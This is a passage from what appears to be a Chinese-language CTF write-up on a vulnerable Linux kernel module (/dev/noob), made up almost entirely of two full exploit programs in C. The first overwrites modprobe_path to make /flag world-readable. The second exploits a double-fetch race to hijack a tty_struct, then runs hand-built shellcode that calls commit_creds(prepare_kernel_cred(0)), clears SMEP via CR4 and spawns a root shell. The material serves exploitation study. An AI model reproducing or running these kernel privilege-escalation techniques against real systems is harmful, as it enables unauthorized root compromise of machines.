user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/noob"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line">    <span class="keyword">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> id[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> address[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= <span class="number">20</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span>(fd,i,buf,<span class="number">0x40</span>);</span><br><span class="line">        uread(fd,i,buf,<span class="number">0x40</span>);</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">5</span>]==buf[<span class="number">6</span>] &amp;&amp; buf[<span class="number">5</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            id[j] = i;</span><br><span class="line">            address[j++] = buf[<span class="number">5</span>]<span class="number">-0x28</span>;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(id[<span class="number">1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Don't find...bad luck...QAQ"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]%d and %d is our target\n"</span>,id[<span class="number">0</span>],id[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]%d addr = %p\n"</span>,id[<span class="number">0</span>],address[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]%d addr = %p\n"</span>,id[<span class="number">1</span>],address[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,id[<span class="number">0</span>],buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,id[<span class="number">1</span>],buf,<span class="number">0x40</span>);</span><br><span class="line">    uread(fd,id[<span class="number">1</span>],buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">size_t</span> key = *buf;</span><br><span class="line">    <span class="keyword">size_t</span> cookie = key ^ address[<span class="number">0</span>] ^ address[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]cookie = %p\n"</span>,cookie);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> mod_base = <span class="number">0xffffffffc0002000</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> magic1 = (cookie^mod_base) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]magic1 = %p\n"</span>,magic1);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> fake_mmap1 = mmap(magic1 &amp; <span class="number">0xfffff000</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);   </span><br><span class="line">    <span class="keyword">if</span>(fake_mmap1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]fake_mmap1 = %p\n"</span>,fake_mmap1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> fake_chunk = magic1 &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]fake_chunk = %p\n"</span>,fake_chunk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> magic2 = (fake_chunk&lt;&lt;<span class="number">32</span>)^cookie^<span class="number">0xffffffffc000461c</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]magic2 = %p\n"</span>,magic2);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> fake_mmap2 = mmap(magic2 &amp; <span class="number">0xfffff000</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);   </span><br><span class="line">    <span class="keyword">if</span>(fake_mmap2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]fake_mmap2 = %p\n"</span>,fake_mmap2);   </span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">int</span> *)magic2 = magic2^cookie;  </span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">int</span>*)fake_chunk = cookie ^ fake_chunk;</span><br><span class="line">    buf[<span class="number">0</span>] = fake_chunk ^ cookie ^ address[<span class="number">1</span>];</span><br><span class="line">    uwrite(fd,id[<span class="number">1</span>],buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">21</span>,buf,<span class="number">0x40</span>);</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">int</span>*)fake_chunk = cookie ^ fake_chunk ^ <span class="number">0xffffffffc000461c</span>;</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">22</span>,buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">23</span>,buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">24</span>,buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">25</span>,buf,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//-----------------------------------------------------------</span></span><br><span class="line">    *buf = <span class="number">0x8245aba000000000</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0x00000040ffffffff</span>;</span><br><span class="line">    uwrite(fd,<span class="number">23</span>,buf,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    *buf = <span class="number">0x7340682e777278782f</span>;</span><br><span class="line">    uwrite(fd,<span class="number">22</span>,buf,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]success!!!"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /trigger"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/trigger"</span>);</span><br><span class="line">    system(<span class="string">"cat /flag"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ffffffff8245aba0 D modprobe_path</span></span><br></pre></td></tr></table></figure>
<h2 id="解法二：-5"><a href="#解法二：-5" class="headerlink" title="解法二："></a>解法二：</h2><h3 id="思路：-6"><a href="#思路：-6" class="headerlink" title="思路："></a>思路：</h3><p>在<code>add</code>函数中存在<code>double fetch</code>，但是概率实在是太低了，我把<code>size</code>的限制给<code>patch</code>掉之后，写出<code>exp</code>是可以打成功的。但是考虑到竞争因素以后，成功概率应该不到百分之一了。。。</p>
<p>PS: 今天出了官方wp。。。竟然真的是这种解法。。。我吐了。</p>
<p><img src="https://i.loli.net/2020/03/11/jALe9w2IxKNbvs3.png" alt="x1.PNG"></p>
<h3 id="exp：-24"><a href="#exp：-24" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> finish;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_size</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)&#123;</span><br><span class="line">        user_chunk-&gt;size = <span class="number">0x400</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810ad430</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/noob"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> p;</span><br><span class="line">    pthread_create(&amp;p,<span class="literal">NULL</span>,change_size,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x68</span>);</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_p = open(<span class="string">"/dev/ptmx"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd_p &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]put error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_operations[<span class="number">13</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_operations[<span class="number">12</span>] =  <span class="number">0xffffffff81075fa0</span>;       </span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x2e0);</span><br><span class="line">    uread(fd,<span class="number">0</span>,buf,<span class="number">0x2e0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct_addr = *((<span class="keyword">size_t</span>*)buf+<span class="number">7</span>)<span class="number">-0x38</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]tty_struct_addr = %p\n"</span>,tty_struct_addr);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    uwrite(fd,<span class="number">0</span>,buf,<span class="number">0x20</span>); </span><br><span class="line"></span><br><span class="line">    ioctl(fd_p,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fake_tty_operations[<span class="number">12</span>] =  tty_struct_addr + <span class="number">0x2e0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* tmp = buf + <span class="number">0x2e0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0x9090</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90ff3148</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = prepare_kernel_cred;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90c78948</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = commit_creds;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tmp = <span class="number">0xf0c7c748</span>; <span class="comment">//mov rdi,0x6f0;</span></span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="number">0x06</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x0</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x220f</span>;  <span class="comment">//mov cr4,rdi;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xe7</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_ss</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_ss;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xB848</span>; <span class="comment">//push user_rsp</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = user_rsp;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="string">'P'</span>; </span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push rflags</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)user_rflags;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_cs</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_cs;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push get_shell</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_shell;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x010f</span>; <span class="comment">//swapgs;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xf8</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0xcf48</span>; <span class="comment">//iretq;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">size_t</span>*)buf+<span class="number">3</span>) = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    uwrite(fd,<span class="number">0</span>,buf,<span class="number">0x400</span>); </span><br><span class="line">    ioctl(fd_p,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
